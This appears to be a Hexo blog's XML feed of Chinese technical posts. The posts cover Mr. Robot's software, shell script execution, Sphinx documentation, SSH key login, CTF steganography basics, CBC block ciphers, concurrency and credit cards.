<h2 id="Tor"><a href="#Tor" class="headerlink" title="Tor"></a><a href="https://www.torproject.org/">Tor</a></h2><p>Tor被广泛认为是最好的匿名工具。它将使你的互联网活动难以被追踪，这个版本 —— 不像Tor浏览器 —— 可以用来托管隐藏服务，这是只能通过Tor访问的站点，并且其物理服务器位置被Tor匿名网络隐藏。Ray通过Tor隐藏服务运行着一条“丝绸之路”，他希望Elliot在第二季第5集中进行网站迁移。</p>
<h2 id="PuTTY"><a href="#PuTTY" class="headerlink" title="PuTTY"></a><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/">PuTTY</a></h2><p>PuTTY是用于连接到Linux服务器的客户端。Elliot在第二季第4集和第5集使用PuTTY连接到运行Kali Linux的VPS（虚拟专用服务器），以便他可以在Ray的计算机上使用安装在VPS上的IRC客户端与Darlene聊天。他还在第二季第5集中使用PuTTY，完成了Ray的“丝绸之路”网站的迁移。</p>
<h2 id="Mozilla-Firefox"><a href="#Mozilla-Firefox" class="headerlink" title="Mozilla Firefox"></a><a href="https://www.mozilla.org/zh-CN/firefox/">Mozilla Firefox</a></h2><p>Elliot使用Firefox作为他的默认浏览器。Trenton在第二季第8集中使用了Firefox。</p>
<h2 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a><a href="https://ffmpeg.org/">FFmpeg</a></h2><p>在第二季第8集中Trenton使用FFmpeg编码一个视频，其中包含一个泄露的关于进行非法大规模监视的FBI电话会议，并通过Tor浏览器向Vimeo上传。</p>
<h2 id="Slackware"><a href="#Slackware" class="headerlink" title="Slackware"></a><a href="http://www.slackware.com/">Slackware</a></h2><p>Slackware是1993年创建的一个Linux发行版，旨在提高设计的稳定性和简单性，并成为最“类Unix”的Linux发行版。Slackware最初是基于Softlanding Linux系统的，它已经成为许多其他Linux发行版的基础，尤其是SUSE Linux发行版的第一个版本，也是最早的发行版本。在第二季第10集中，当Elliot与黑暗军队达成拯救Darlene生命的交易时，Leon给了他一台安装有Slackware的笔记本电脑，用于将黑暗军队的项目移动到刚果。</p>
<h2 id="VLC-Media-Player"><a href="#VLC-Media-Player" class="headerlink" title="VLC Media Player"></a><a href="https://www.videolan.org/vlc/">VLC Media Player</a></h2><p>VLC媒体播放器被用于第二季第4集，当时Elliot和Darlene一起观看了虚假恐怖片《Careful Massacre of the Bourgeoisie》的VHS版本。VLC也被用于第二季第8集，当fsociety预览一个他们将上传的关于非法大规模监视的泄露的FBI电话会议视频时。</p>
<h2 id="Wayback-Machine"><a href="#Wayback-Machine" class="headerlink" title="Wayback Machine"></a><a href="http://web.archive.org/">Wayback Machine</a></h2><p>由Internet Archive运营的Waybach Machine是一个包含超过4,900亿个网页副本的数据库。在第二季第8集中FBI特工Dominique DiPierro向Mobley透露，联邦调查局使用了Wayback Machine，以便将他的黑客把柄与他为DJ Mobley创建的旧的粉丝页面联系起来。</p>
<h2 id="µTorrent"><a href="#µTorrent" class="headerlink" title="µTorrent"></a><a href="https://www.utorrent.com/intl/zh_cn/utweb-index">µTorrent</a></h2><p>第二季第4集达琳用μTorrent下载了虚假恐怖电影《Careful Massacre of the Bourgeoisie》的VHS版本。</p>
]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title>source、sh 与 ./</title>
    <url>/2018/05/09/source-sh/</url>
    <content><![CDATA[<h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p><code>source a.sh</code> 在当前 Shell 中执行 <code>a.sh</code>，<code>a.sh</code> 不需要有执行权限。<code>source</code> 也可以简写为 <code>.</code>，比如 <code>. a.sh</code>。</p>
<h2 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h2><p><code>sh a.sh</code> 打开一个子 Shell 去执行 <code>a.sh</code>，<code>a.sh</code> 不需要有执行权限。在子 Shell 里执行的 <code>a.sh</code> 里设置的变量，不会影响到父 Shell。类似的，<code>bash</code> 与 <code>sh</code> 同理。</p>
<h2 id=""><a href="#" class="headerlink" title="./"></a>./</h2><p><code>./a.sh</code> 打开一个子 Shell 去执行 <code>a.sh</code>，<code>a.sh</code> 需要有执行权限。注意，这里 <code>./</code> 与 <code>a.sh</code> 之间没有空格，换个角度看，其实没有使用任何命令，只是指定了当前文件夹下的这个文件而已。这就相当于双击这个文件去运行一样，那这个文件肯定要具有可执行权限。至于为什么要加 <code>./</code>，我猜想是为了预防与环境变量中相同的名称引起冲突。</p>
<p>前面采用了相对路径的方法，当然也可以采用绝对路径，比如 <code>/root/a.sh</code> 这样，同样可以执行。</p>
<p>另外，<code>./</code> 运行的文件里通常有 <strong>Shebang</strong> 一行，也就是以 <code>#!</code> 开头的第一行，用以指明执行这个脚本文件的解释程序。如果没有 Shebang 一行，那么以 <code>./a.sh</code> 运行脚本时，会自动使用环境变量中的 <code>$SHELL</code> 变量所指定的解释器来运行。</p>
<p>最后，在以 <code>sh a.sh</code> 或 <code>bash a.sh</code> 这样的命令运行脚本时，即使文件中指明了 Shebang，也会自动忽略，因为在命令中已经明确指定了所采用的解释器。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Sphinx 生成项目文档</title>
    <url>/2020/01/22/sphinx-document/</url>
    <content><![CDATA[<p><a href="http://www.sphinx-doc.org/en/master/">Sphinx</a> 是一个用 Python 编写的文档生成工具，其使用 <a href="/2018/09/17/restructuredtext/" title="reStructuredText">reStructuredText</a> 作为标记语言，目前广泛应用于 Python 相关项目的文档生成。比如 <a href="https://docs.python.org/zh-cn/3/">Python 官方文档</a>就是基于 Sphinx 生成的，此外 <a href="https://www.kernel.org/doc/html/latest/index.html">Linux 内核文档</a>的生成也于 2016 年从 <a href="http://www.doxygen.nl/">Doxygen</a> 转向 Sphinx，要了解更多使用 Sphinx 的项目可参考其<a href="https://www.sphinx-doc.org/en/master/examples.html">官方列表</a>。</p>
<span id="more"></span>

<p>使用 <code>pip install sphinx</code> 即可安装 Sphinx。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>按照最佳实践，项目文档一般是在项目的 <code>docs</code> 目录中，所以不妨先创建一个 <code>docs</code> 目录并进入，之后的一切有关 sphinx 的命令都在此目录中运行。</p>
<p>安装完 Sphinx 并进入 <code>docs</code> 目录后，输入 <code>sphinx-quickstart</code> 即可创建一个文档项目。该引导程序会询问你一些问题，并根据你给出的回答对生成的文档项目进行相关配置，当然，这些配置都可以在生成后的 <code>conf.py</code> 文件中进行重新设置。以下是它可能会问到的一些问题：</p>
<ul>
<li>分隔“source”和“build”目录（y/n）[n]：默认不分隔即可</li>
<li>项目名称：项目名称将显示在左侧导航栏顶部</li>
<li>作者姓名：作者姓名将显示在页面底部</li>
<li>项目版本：可不填</li>
<li>项目语言[en]：默认为英文，要切换为中文请输入 <code>zh_CN</code></li>
</ul>
<p>执行完成后，会在当前目录下生成如下文件/文件夹：</p>
<ul>
<li><code>_duild/</code>：存放构建之后的文件</li>
<li><code>_static/</code>：存放静态文件</li>
<li><code>_templates/</code>：存放模板文件</li>
<li><code>conf.py</code>：sphinx 的配置文件</li>
<li><code>index.rst</code>：文档主页</li>
<li><code>Makefile</code>：Linux 下 <code>make</code> 构建工具的配置文件</li>
<li><code>make.bat</code>：Windows 下的构建命令脚本</li>
</ul>
<p>编写完文档后，使用 <code>make html</code> 命令即可将其构建为 HTML 文件，其中，<code>html</code> 被称为构建器（builder），当然，你也可以使用别的构建器，比如 <code>latex</code>、<code>epub</code> 等。</p>
<p>输入 <code>make help</code> 可查看 make 支持的相关命令。</p>
<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>Sphinx 生成的 HTML 文件默认使用的主题为 <a href="https://github.com/bitprophet/alabaster">Alabaster</a>（个人觉得挺好看的，<a href="https://cn.python-requests.org/zh_CN/latest/">Requests</a> 和 <a href="https://flask.palletsprojects.com/en/1.1.x/">Flask</a> 项目文档的主题都是基于此主题修改的），除此之外，Sphinx 还内置了一些别的主题，具体可见其<a href="https://www.sphinx-doc.org/en/master/usage/theming.html#builtin-themes">官方文档中列出的</a>（个人觉得其余的主题不如 Alabaster 好看），当然，你也可以使用第三方主题。</p>
<p>第三方主题中最常见的非 <a href="https://github.com/readthedocs/sphinx_rtd_theme">sphinx_rtd_theme</a> 莫属，<a href="https://docs.scrapy.org/en/latest/">Scrapy</a> 项目的文档就使用的它，要使用 sphinx_rtd_theme，需要先执行 <code>pip install sphinx_rtd_theme</code> 命令下载它，然后修改 <code>conf.py</code> 配置文件中的 <code>html_theme</code> 变量为 <code>&#39;sphinx_rtd_theme&#39;</code> 并在 <code>extensions</code> 列表中添加 <code>&#39;sphinx_rtd_theme&#39;</code>。</p>
<p>要探索更多的第三方主题，可参考 <a href="https://sphinx-themes.org/">Sphinx Themes</a> 网站上收录的。</p>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>Sphinx 支持扩展，安装完 Sphinx 后就已经内置了一些扩展，除此之外，你也可以下载第三方扩展。</p>
<h3 id="内置扩展"><a href="#内置扩展" class="headerlink" title="内置扩展"></a>内置扩展</h3><h4 id="sphinx-ext-autodoc"><a href="#sphinx-ext-autodoc" class="headerlink" title="sphinx.ext.autodoc"></a>sphinx.ext.autodoc</h4><h4 id="sphinx-ext-coverage"><a href="#sphinx-ext-coverage" class="headerlink" title="sphinx.ext.coverage"></a>sphinx.ext.coverage</h4><h4 id="sphinx-ext-viewcode"><a href="#sphinx-ext-viewcode" class="headerlink" title="sphinx.ext.viewcode"></a>sphinx.ext.viewcode</h4><h4 id="sphinx-ext-napoleon"><a href="#sphinx-ext-napoleon" class="headerlink" title="sphinx.ext.napoleon"></a>sphinx.ext.napoleon</h4><h4 id="sphinx-ext-graphviz"><a href="#sphinx-ext-graphviz" class="headerlink" title="sphinx.ext.graphviz"></a>sphinx.ext.graphviz</h4><h4 id="sphinx-ext-todo"><a href="#sphinx-ext-todo" class="headerlink" title="sphinx.ext.todo"></a>sphinx.ext.todo</h4><h3 id="第三方扩展"><a href="#第三方扩展" class="headerlink" title="第三方扩展"></a>第三方扩展</h3><h4 id="recommonmark"><a href="#recommonmark" class="headerlink" title="recommonmark"></a>recommonmark</h4><h4 id="nbsphinx"><a href="#nbsphinx" class="headerlink" title="nbsphinx"></a>nbsphinx</h4><h4 id="sphinx-autodoc-typehints"><a href="#sphinx-autodoc-typehints" class="headerlink" title="sphinx-autodoc-typehints"></a>sphinx-autodoc-typehints</h4><h4 id="sphinx-gallery"><a href="#sphinx-gallery" class="headerlink" title="sphinx-gallery"></a>sphinx-gallery</h4><h2 id="Read-the-Docs"><a href="#Read-the-Docs" class="headerlink" title="Read the Docs"></a>Read the Docs</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>SSH 协议分析</title>
    <url>/2018/08/24/ssh/</url>
    <content><![CDATA[<p>SSH（Secure Shell）即<strong>安全外壳协议</strong>，是一种位于应用层的加密的网络传输协议，虽然任何网络服务都可以通过 SSH 实现安全传输，但其最常见的用途还是远程登录，是 Telnet 等非安全 Shell 的替代品。</p>
<h2 id="OpenSSH-的运行机制"><a href="#OpenSSH-的运行机制" class="headerlink" title="OpenSSH 的运行机制"></a>OpenSSH 的运行机制</h2><p>SSH 是一种协议，其实现多种多样，目前使用最广泛的实现是 OpenSSH 项目。当使用 <code>ssh user@host</code> 命令进行登录时，所完成的整个过程如下：</p>
<ol>
<li>远程主机收到用户的登录请求，把自己的公钥发给用户</li>
<li>用户使用这个公钥，将登录密码加密后，发送给远程主机</li>
<li>远程主机用自己的私钥，解密登录密码，若密码正确，则同意用户登录</li>
<li>后续过程中，用户发送的信息都采用此方式进行加密发送</li>
</ol>
<span id="more"></span>

<p>因为不像 HTTPS 协议，SSH 协议的公钥是没有证书中心（CA）公证的，所以为了防止中间人攻击，当用户第一次登录远程主机时，系统会提示如下信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The authenticity of host &#x27;host (12.18.429.21)&#x27; can&#x27;t be established.</span><br><span class="line">RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)?</span><br></pre></td></tr></table></figure>

<p>即系统无法确认远程主机的真实性（远程主机有可能是中间人），只知道远程主机的公钥指纹，询问用户是否继续连接。公钥指纹就是对公钥进行哈希计算得到的，为了方便用户的比较。用户并没有什么好的办法得知自己想要连接的真实远程主机的公钥指纹，一个可行的办法是远程主机在其官方网站上贴出自己的公钥指纹，方便用户和系统提示的指纹进行比较。</p>
<p>假定当用户进行风险衡量后决定继续连接，接下来的过程就如上述提到的一样。远程主机的公钥会被保存在 <code>$HOME/.ssh/known_hosts</code> 文件中，当用户下次再连接时，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码。</p>
<p>除了采用口令登录外，还可使用<strong>公钥登录</strong>，原理为：用户将自己的公钥储存在远程主机上，登录时，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来，远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录 shell，不再要求密码。</p>
<p>OpenSSH 提供了一个工具 — <code>ssh-keygen</code>，使用它可以方便的生成一对公私钥，生成的公钥为 <code>id_rsa.pub</code>，私钥为 <code>id_rsa</code>，保存在 <code>$HOME/.ssh</code> 目录下，当然你可以使用 <code>-t</code>（type）参数指定密钥的类型（默认生成类型为 RSA），使用 <code>-f</code>（file）参数指定生成的目录文件名，使用 <code>-C</code>（Comment）参数指定注释，更多的参数可以使用 <code>--help</code> 参数查看。</p>
<p>生成的公钥格式为 <code>&lt;protocol&gt; &lt;key-blob&gt; &lt;comment&gt;</code>，其中注释项通常用来指代要登录的用户名。</p>
<p>有了密钥对后，可以使用 <code>ssh-copy-id user@host</code> 命令将自己的公钥上传至远程主机，远程主机会将用户的公钥，保存在登录后的用户主目录的 <code>$HOME/.ssh/authorized_keys</code> 文件中。实际上，<code>ssh-copy-id</code> 命令的整个过程就如下命令一样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh user@host <span class="string">&#x27;mkdir -p .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys&#x27;</span> &lt; ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>实际上，<code>ssh-copy-id</code> 还会对创建的文件及文件夹进行相关的权限设置，这里不过多介绍。</p>
<p>最后还要对远程主机的 SSH 服务端配置文件，即 <code>/etc/ssh/sshd_config</code> 文件进行相关配置，并重启 SSH 服务即可生效。具体而言，涉及到的配置项如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>紧接着使用 <code>service sshd restart</code> 重启 SSH 服务。</p>
<h2 id="快速登录"><a href="#快速登录" class="headerlink" title="快速登录"></a>快速登录</h2><p><code>$HOME/.ssh</code> 目录下的 <code>config</code> 文件可配置快速登录选项，若没有，可以新建一个，具体而言，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">host aliyun</span><br><span class="line">    user howie</span><br><span class="line">    hostname 192.168.0.41</span><br><span class="line">    port 22</span><br><span class="line">    identityfile ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>

<p>这代表当输入 <code>ssh aliyun</code> 时，其默认执行 <code>ssh howie@192.168.0.41 -p 22 -i ~/.ssh/id_rsa</code>。当有多个别名需要设置时，其中间要空上一行。</p>
<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p>使用密钥连接后仍然需要输入登录密码：<br>这种情况一般是由于密钥登录失败所导致的，请检查 <code>$HOME/.ssh</code> 目录是否为 700 权限，<code>$HOME/.ssh/authorized_keys</code> 文件是否为 600 权限，除此之外的其他权限均不能成功。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>隐写术</title>
    <url>/2018/09/22/steganography/</url>
    <content><![CDATA[<h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>拿到一个被隐写的文件，第一步当然是判断该文件是哪种类型的文件，一般可以通过文件后缀名判断之，若不能通过文件后缀名判断，则可以使用 Linux 中的 <code>file</code> 命令，直接输入 <code>file a</code> 即可检查 a 文件的类型。</p>
<p>知道文件类型后，就可以对症下药，依据相应的类型使用相应的办法，此时，不妨再查看一下文件对应的二进制数据，所有电子信息的本质无非是二进制，可以在二进制数据中搜索 <code>CTF</code> 或 <code>FLAG</code> 等关键字，发现是否存在隐藏信息。Windows 下可以使用 Sublime Text 3 的插件 <a href="http://facelessuser.github.io/HexViewer/">HexViewer</a> 查看二进制信息。Linux 下可以使用 <code>xxd</code> 命令查看文件二进制数据。</p>
<h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><h3 id="图片内容"><a href="#图片内容" class="headerlink" title="图片内容"></a>图片内容</h3><p>首先应该检查图片内容本身是否存在某些隐藏信息，遇到不熟悉的图片可以尝试<a href="https://www.google.com/imghp">谷歌搜图</a>，或许可以发现更多信息。</p>
<h3 id="Exif"><a href="#Exif" class="headerlink" title="Exif"></a>Exif</h3><p>Exif，即可交换图像文件格式（Exchangeable image file format），可以记录 JPEG 格式图片的属性信息和拍摄数据。有的 JPEG 格式图片会具有 Exif 信息，在 Windows 中查看属性选项卡中的详细信息项即可查看。别的格式的图片不具备 Exif 信息。如下图片：</p>
<p><img src="/images/meinv.jpg" alt="exif"></p>
<span id="more"></span>

<h3 id="JPEG"><a href="#JPEG" class="headerlink" title="JPEG"></a>JPEG</h3><h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h3><h3 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h3><h3 id="BMP"><a href="#BMP" class="headerlink" title="BMP"></a>BMP</h3><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><p>音频隐写一般会用到 <a href="http://www.petitcolas.net/steganography/mp3stego/">MP3stego</a>，该软件会将信息编码到 MP3 文件中，同时也可以从被隐写的 MP3 文件中解码所需信息。</p>
<p>下载该软件后在其 <code>MP3Stego</code> 文件夹下会有 2 个命令：<code>Encode</code> 和 <code>Decode</code>，<code>Encode</code> 命令用于隐写信息，<code>Decode</code> 命令用于解密被隐写的信息，使用 <code>decode -X -P pass svega_stego.mp3</code> 即可从 <code>svega_stego.mp3</code> 文件中解码所需信息，<code>-P</code> 指定解密密码。</p>
<h2 id="视频隐写"><a href="#视频隐写" class="headerlink" title="视频隐写"></a>视频隐写</h2><h2 id="其他隐写"><a href="#其他隐写" class="headerlink" title="其他隐写"></a>其他隐写</h2><h3 id="Word-文档"><a href="#Word-文档" class="headerlink" title="Word 文档"></a>Word 文档</h3><p>Word 文档可能会隐藏某些信息，遇到 <code>doc</code> 文档可以尝试在 <code>Word 选项</code>中选择<code>显示</code>并打开<code>隐藏文字</code>选项。如下所示：</p>
<p><img src="/images/word.PNG" alt="word"></p>
<p>像 Word 文档或 Excel 表格这样的富文本文件，可以直接解压之，查看其中是否包含某些特殊文件。</p>
<p>类似的题可以参考 <a href="http://www.shiyanbar.com/ctf/1927">Fonts</a>，<a href="http://www.shiyanbar.com/ctf/1849">认真你就输了</a>等等。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>对称加密</title>
    <url>/2021/03/11/symmetric-encryption/</url>
    <content><![CDATA[<p>本文讨论现代密码学中的对称加密。</p>
<p>对称加密技术有两种宽泛的类型：<strong>块密码</strong>（block cipher）和<strong>流密码</strong>（stream cipher）。块密码用在多种因特网协议的加密中，包括 PGP、<a href="/2018/05/11/https/" title="SSL">SSL</a> 和 <a href="/2018/05/11/ipsec/" title="IPsec">IPsec</a> 等；流密码用在无线 LAN 的安全性中。</p>
<span id="more"></span>

<h2 id="块密码"><a href="#块密码" class="headerlink" title="块密码"></a>块密码</h2><p>在块密码中，要加密的报文被处理为 $k$ 比特的块。为了加密一个块，该密码采用了一对一映射，将 $k$ 比特块的明文映射为 $k$ 比特块的密文。</p>
<p>假设 $k=3$，因此块密码将 3 比特输入（明文）映射为 3 比特输出（密文）。下表给出了一种可能的映射：</p>
<table>
<thead>
<tr>
<th>输入/输出</th>
<th>比特块</th>
<th>比特块</th>
<th>比特块</th>
<th>比特块</th>
<th>比特块</th>
<th>比特块</th>
<th>比特块</th>
<th>比特块</th>
</tr>
</thead>
<tbody><tr>
<td>输入</td>
<td>000</td>
<td>001</td>
<td>010</td>
<td>011</td>
<td>100</td>
<td>101</td>
<td>110</td>
<td>111</td>
</tr>
<tr>
<td>输出</td>
<td>110</td>
<td>111</td>
<td>101</td>
<td>100</td>
<td>011</td>
<td>010</td>
<td>000</td>
<td>001</td>
</tr>
</tbody></table>
<p>可以验证，报文 <code>010110001111</code> 被加密成了 <code>101000111001</code>。</p>
<p>注意到上述映射只是许多可能映射中的一种，观察到一个映射只不过是所有可能输入的排列，共有 $2^3$（=8）种可能的输入（排列在“输入”栏中），这 8 种输入能够排列为 $8!=40320$ 种不同方式，因此共有 40320 种可能的映射。我们能够将这些映射的每种视为一个密钥，即如果 A 和 B 都知道该映射（密钥），它们能够加密和解密在它们之间发送的报文。</p>
<p>对这种密码的蛮力攻击即通过使用所有映射来尝试解密密文，为了挫败蛮力攻击，块密码通常使用大得多的块，由 64 比特甚至更多比特组成。注意到对于通常的 $k$ 比特块密码，可能映射数量是 $2^k!$，对于即使不大的 $k$ 值（如 $k=64$），这也是一个天文数字。</p>
<p>像上面这种在所有输入和输出之间提供了预先决定的映射的方法称为<strong>全表块密码</strong>，尽管全表块密码对于不大的 $k$ 值能够产生健壮的对称密钥加密方案，但这要求加密双方各维护一张具有 $2^k$ 个输入值的表，这是一个难以实现的任务。此外，如果加密双方要改变密钥，它们将不得不各自重新生成该表。</p>
<p>取而代之的是，块密码通常使用函数模拟随机排列表。下图显示了当 $k=64$ 时，这种函数的一个例子。</p>
<p><img src="/images/block-cipher-example.jpg" alt="block cipher example"></p>
<p>该函数首先将 64 比特块划分为 8 个块，每个块由 8 比特组成。每个 8 比特块由一个“8 比特到 8 比特”表处理，这是个可管理的长度。例如，第一个块由标志为 $T_1$ 的表来处理。接下来，这 8 个输出块被重新装配成一个 64 比特的块。该输出被回馈到 64 比特的输入，开始了第二次循环。经 n 次这样的循环后，该函数提供了一个 64 比特的密文块。这种循环的目的是使得每个输入比特影响最后输出比特的大部分（即使不是全部）。（如果仅使用一次循环，一个给定的输入比特将仅影响 64 输出比特中的 8 比特。）这种块密码算法的密钥将是 8 张排列表（假定置乱函数是公共已知的）。</p>
<p>目前有一些流行的块密码，包括 DES、3DES 和 AES 等。这些标准都使用了函数（而不是预先决定的表），连同上图中的线（虽然对每种密码来说更为复杂和具体）。这些算法也都使用了比特串作为密钥。一个算法的密钥决定了特定“小型表”映射和该算法内部的排列。</p>
<h3 id="密码块链接"><a href="#密码块链接" class="headerlink" title="密码块链接"></a>密码块链接</h3><p>对于相同的块，块密码当然将产生相同的密文，这是不安全的，为了解决这个问题，可以在密文中混合某些随机性，使得相同的明文块产生不同的密文块。</p>
<p>在介绍其思想之前，先明确一些术语：令 $m(i)$ 表示第 $i$ 个明文块，$c(i)$ 表示第 $i$ 个密文块，并且 $a\oplus b$ 表示两个比特串 $a$ 和 $b$ 的异或（XOR），另外，将具有密钥 $S$ 的块密码加密算法表示为 $K_S$。</p>
<p>其基本思想如下：</p>
<p>发送方为第 $i$ 块生成一个随机的 $k$ 比特数 $r(i)$，并且计算 $c(i)=K_S(m(i)\oplus r(i))$。注意到每块选择一个新的 $k$ 比特随机数。则发送方发送 $c(1)$、$r(1)$、$c(2)$、$r(2)$、$c(3)$ 和 $r(3)$ 等等。因为接收方接收到 $c(i)$ 和 $r(i)$，它能够通过计算 $m(i)=K_S(c(i)\oplus r(i))$ 而恢复每个明文块。</p>
<p>尽管 $r(i)$ 是以明文发送的，但嗅探者无法获得明文 $m(i)$，因为它不知道密钥 $K_S$。如果两个明文块 $m(i)$ 和 $m(j)$ 是相同的，对应的密文块 $c(i)$ 和 $c(j)$ 将是不同的（只要随机数 $r(i)$ 和 $r(j)$ 不同，这种情况出现的概率将很高）。</p>
<p>举例来说，参照上表的 3 比特块密码，假设明文是 <code>010010010</code>，若直接加密，没有包括随机性，则密文为 <code>101101101</code>；若使用上述技术加密，假设生成了随机块 $r(1)=001$，$r(2)=111$ 和 $r(3)=100$，则生成的密文为 $c(1)=100$，$c(2)=010$ 和 $c(3)=000$。</p>
<p>引入随机性解决了一个问题而产生了另一个问题，即发送方必须传输以前两倍的比特。实际上，对每个加密比特，它现在必须再发送一个随机比特，使需要的带宽加倍。为了有效利用该技术，块密码通常使用了一种称为<strong>密码块链接</strong>（Cipher Block Chaining，<strong>CBC</strong>）的技术。其基本思想是 <em>仅随第一个报文发送一个随机值，然后让发送方和接收方使用计算的编码块代替后继的随机数</em>。具体而言，CBC 运行过程如下：</p>
<ol>
<li>在加密报文（或数据流）之前，发送方生成一个随机的 $k$ 比特串，称为<strong>初始向量</strong>（Initialization Vector，<strong>IV</strong>）。将该初始向量表示为 $c(0)$。发送方以 <em>明文方式</em> 将 IV 发送给接收方。</li>
<li>对第一个块，发送方计算 $m(1)\oplus c(0)$，即计算第一块明文与 IV 的异或。然后通过块密码算法运行得到的结果以得到对应的密文块，即 $c(1)=K_S(m(1)\oplus c(0))$。发送方向接收方发送加密块 $c(1)$。</li>
<li>对于第 $i$ 个块，发送方根据 $c(i)=K_S(m(i)\oplus c(i-1))$ 生成第 $i$ 个密文块。</li>
</ol>
<p>当接收方接收到 $c(i)$ 时，它用 $K_S$ 解密之以获得 $s(i)=m(i)\oplus c(i-1)$；因为接收方已经知道 $c(i-1)$，则从 $m(i)=s(i)\oplus c(i-1)$ 获得明文块。</p>
<p>举例来说，参照上表的 3 比特块密码，假设明文是 <code>010010010</code>，$IV=c(0)=001$，则 $c(1)=K_S(m(1)\oplus c(0))=100$，$c(2)=K_S(m(2)\oplus c(1))=K_S(010\oplus 100)=000$，$c(3)=K_S(m(3)\oplus c(2))=K_S(010\oplus 000)=101$。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://book.douban.com/subject/30280001/">James F. Kurose,Keith W. Ross.计算机网络：自顶向下方法[M].北京:机械工业出版社,2018:390-392.</a></li>
</ol>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>聊聊并发编程</title>
    <url>/2021/04/13/talk-about-concurrent-programming/</url>
    <content><![CDATA[<h2 id="并发与并行"><a href="#并发与并行" class="headerlink" title="并发与并行"></a>并发与并行</h2><p>并发与并行，这是一个老生常谈的问题，简单来说，<strong>并发</strong>（concurrent）指的是在某个<strong>时间段</strong>内有多个程序在执行，而<strong>并行</strong>（parallel）指的是在某个<strong>时间点</strong>有多个程序在执行。</p>
<p>这也就是说，在某种程度上而言，<strong>并发是伪并行</strong>，真正的并行需要多个核心。由于现代计算机的核心往往是有限的，但通常运行的程序远大于核心数，所以在计算机科学中，<strong>并发</strong>往往是我们探讨的重点。</p>
<p>Go 语言的创造者之一 Rob Pike 就曾经指出：</p>
<blockquote>
<p>并发用于制定方案，用来解决可能（但未必）并行的问题。</p>
</blockquote>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>说说信用卡</title>
    <url>/2019/01/08/talk-about-credit-card/</url>
    <content><![CDATA[<h2 id="年费"><a href="#年费" class="headerlink" title="年费"></a>年费</h2><p>所谓<strong>年费</strong>，即每年的管理费，几乎所有信用卡都有年费，年费一般可以通过两种方法免去，即<strong>刷够指定额度</strong>或<strong>刷够指定笔数</strong>，具体采用哪种方法依据特定的信用卡而定。有的信用卡是“<strong>终身免年费</strong>”的，这里的终身一般指信用卡的<strong>有效期</strong>内。</p>
<h2 id="有效期"><a href="#有效期" class="headerlink" title="有效期"></a>有效期</h2><p>为了保护信用卡的安全，信用卡是有有效期的，一般印在信用卡上的<strong>VALID THRU</strong>字段，比如05/26代表2026年5月过期，过期之后要重新去银行办理。</p>
<span id="more"></span>
<h2 id="等级"><a href="#等级" class="headerlink" title="等级"></a>等级</h2><p>信用卡的等级从低到高一般分为<strong>普卡</strong>、<strong>金卡</strong>（Gold）、<strong>白金卡</strong>（Platinum）等，等级越高，优惠越多，额度越大，但相应的，年费也会越高。</p>
<h2 id="溢缴款"><a href="#溢缴款" class="headerlink" title="溢缴款"></a>溢缴款</h2><p>信用卡不同于借记卡（或储蓄卡），信用卡的主要目的是用于消费，而不是存款，因此，存在信用卡里面的钱是没有利息的，这笔钱被叫做<strong>溢缴款</strong>，溢缴款取现是要收取手续费的。但在消费时，会优先扣除溢缴款，随后扣除额度。</p>
<h2 id="银行卡组织"><a href="#银行卡组织" class="headerlink" title="银行卡组织"></a>银行卡组织</h2><p>不同银行之间要实现互相转账就要靠<strong>银行卡组织</strong>的协调，在中国使用最多的卡组织是<strong>银联</strong>（UnionPay），在美国使用最多的卡组织是<strong>Visa</strong>，在欧洲使用最多的卡组织是<strong>MasterCard</strong>（万事达），在日本使用最多的卡组织是<strong>JCB</strong>。当你准备在海外购物时，就十分有必要办一张支持海外卡组织的信用卡，比如Visa信用卡。</p>
